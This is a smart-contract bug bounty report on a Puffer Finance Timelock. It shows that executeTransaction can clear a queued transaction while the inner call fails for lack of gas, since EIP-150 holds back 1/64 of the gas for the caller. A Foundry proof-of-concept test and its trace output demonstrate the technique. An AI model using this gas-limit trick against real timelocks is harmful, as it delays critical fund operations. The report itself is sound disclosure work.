# 28623 - \[SC - Low] Timelock transaction that consume more then \_ g...

Submitted on Feb 22nd 2024 at 17:00:05 UTC by @OxDEADBEEF for [Boost | Puffer Finance](https://immunefi.com/bounty/pufferfinance-boost/)

Report ID: #28623

Report type: Smart Contract

Report severity: Low

Target: <https://etherscan.io/address/0xd9a442856c234a39a81a089c06451ebaa4306a72>

Impacts:

* Contract fails to deliver promised returns, but doesn't lose value
* Temporary freezing of funds for at least 1 hour
* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The timelock's `executeTransaction` does not validate that it has enough gas to execute the underlying transaction. Because of eip-150's `63/64` gas rule - transactions that need more then `209_595` gas to execute can fail due to out of gas while the parent transaction transaction has enough gas (1/64) to successfully finish the transaction

## Vulnerability Details

`executeTransaction` calls the `target` with the `callData`.

```solidity
    function executeTransaction(address target, bytes calldata callData, uint256 operationId)
        external
        returns (bool success, bytes memory returnData)
    {
--------------
        queue[txHash] = 0;
        (success, returnData) = _executeTransaction(target, callData);

        emit TransactionExecuted(txHash, target, callData, operationId);

        return (success, returnData);
    }
    
function _executeTransaction(address target, bytes calldata callData) internal returns (bool, bytes memory) {
        // slither-disable-next-line arbitrary-send-eth
        return target.call(callData);
    }
```

As can be seen above - After calling the target, not much gas is needed to finish the transaction. After EIP-150 the EVM reserves 1/64 of the gas consumed target so that `executeTransaction` can finish the transaction. As seen in the POC - the minimum amount of gas target needs to consume in order to leave enough gas for the transaction to succeed is `209_595`.

If target needs more then that - the target can fail due to out of gas while the `executeTransaction` and the transaction will be deleted from the queue:

1. `executeTransaction` is called with `214_640` gas.
2. `target` consumes all `209_595` gas and runs out
3. Upper transaction did not revert and `queue[txHash] = 0;` .

I suggest to check after the call to target if there is more then needed gasleft

## Impact Details

When the `OPERATIONS_MULTISIG` calls `executeTransaction` to execute a long waited transaction it can by mistake or maliciously set the exact gas needed for `executeTransaction` to succeed but the underlying call to target will fail.

This means that the transaction would need to be listed again in the timelock. If the call to target resolves around movement of funds or any other critical operation - it will be delayed

## Proof of Concept

Add the following function to `Timelock.t.sol`

```solidity
    function gasConsumingFunc() external {
        uint256 gasToConsume = 209595;
        uint256 gasStart = gasleft();
        for(uint256 i = 0; gasStart - gasleft() < gasToConsume; i++ ) {
            assembly {
                let x := mload(0x1337)
            }
        }
    }
    function test_execute_fails() public {
        vm.startPrank(timelock.OPERATIONS_MULTISIG());

        bytes memory callData = abi.encodeCall(this.gasConsumingFunc, ());

        uint256 operationId = 1234;

        bytes32 txHash = timelock.queueTransaction(address(this), callData, operationId);

        uint256 lockedUntil = block.timestamp + timelock.delay();
        
        vm.warp(lockedUntil + 20);

        uint256 gasToUse = 214_640;
        timelock.executeTransaction{gas: gasToUse}(address(this), callData, operationId);
    }
```

To run the test:

```
forge test --match-test test_execute_fails -vvvv
```

Expected output:

```
[PASS] test_execute_fails() (gas: 236021)
Traces:
  [236021] TimelockTest::test_execute_fails()
    ├─ [227] Timelock::OPERATIONS_MULTISIG() [staticcall]
    │   └─ ← operationsMultisig: [0x78dE5808728A273648A7D301D7767C4fd5Dc0fF6]
    ├─ [0] VM::startPrank(operationsMultisig: [0x78dE5808728A273648A7D301D7767C4fd5Dc0fF6])
    │   └─ ← ()
    ├─ [29140] Timelock::queueTransaction(TimelockTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x70c61722, 1234)
    │   ├─ emit TransactionQueued(txHash: 0x2f606a6f8ff5ba05ce0676cf365e2a06b4c8689e009403cf2324b015a1f0fe7d, target: TimelockTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], callData: 0x70c61722, operationId: 1234, lockedUntil: 604802 [6.048e5])
    │   └─ ← 0x2f606a6f8ff5ba05ce0676cf365e2a06b4c8689e009403cf2324b015a1f0fe7d
    ├─ [404] Timelock::delay() [staticcall]
    │   └─ ← 604801 [6.048e5]
    ├─ [0] VM::warp(604822 [6.048e5])
    │   └─ ← ()
    ├─ [214640] Timelock::executeTransaction(TimelockTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x70c61722, 1234)
    │   ├─ [209600] TimelockTest::gasConsumingFunc()
    │   │   └─ ← EvmError: OutOfGas
    │   ├─ emit TransactionExecuted(txHash: 0x2f606a6f8ff5ba05ce0676cf365e2a06b4c8689e009403cf2324b015a1f0fe7d, target: TimelockTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], callData: 0x70c61722, operationId: 1234)
    │   └─ ← false, 0x
    └─ ← ()

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.51ms
```

As can be seen the transaction succeeds while `gasConsumingFunc` fails

```
    │   ├─ [209600] TimelockTest::gasConsumingFunc()
    │   │   └─ ← EvmError: OutOfGas
---------
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.51ms
```
